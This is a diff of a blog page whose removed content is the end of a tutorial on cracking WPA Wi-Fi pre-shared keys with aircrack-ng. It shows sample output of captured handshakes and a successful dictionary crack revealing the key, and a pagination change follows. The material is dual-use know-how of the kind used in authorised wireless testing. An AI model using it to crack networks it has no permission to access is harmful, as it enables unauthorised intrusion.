-<p>Here is typical output when handshakes are found:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Opening psk-01.cap</span><br><span class="line">Opening psk-02.cap</span><br><span class="line">Opening psk-03.cap</span><br><span class="line">Opening psk-04.cap</span><br><span class="line">Read 1827 packets.</span><br><span class="line"></span><br><span class="line">#  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">1  00:14:6C:7E:40:80  teddy                     WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br></pre></td></tr></table></figure>
-<p>Now at this point, aircrack-ng will start attempting to crack the pre-shared key. Depending on the speed of your CPU and the size of the dictionary, this could take a long time, even days. </p>
-<p>Here is what successfully cracking the pre-shared key looks like:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                           Aircrack-ng 0.8</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             [00:00:00] 2 keys tested (37.20 k/s)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                     KEY FOUND! [ 12345678 ]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E </span><br><span class="line">                 B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD </span><br><span class="line"> </span><br><span class="line">Transcient Key : 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 </span><br><span class="line">                 CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40 </span><br><span class="line">                 FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E </span><br><span class="line">                 2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71 </span><br><span class="line"> </span><br><span class="line">EAPOL HMAC     : 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB</span><br></pre></td></tr></table></figure>
-<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>source: <a href="http://www.aircrack-ng.org/doku.php?id=cracking_wpa#troubleshooting_tips" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=cracking_wpa#troubleshooting_tips</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Security/">Security</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/11/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/13/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/11/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/13/">Next &raquo;</a>
     </nav>
   
 </div>
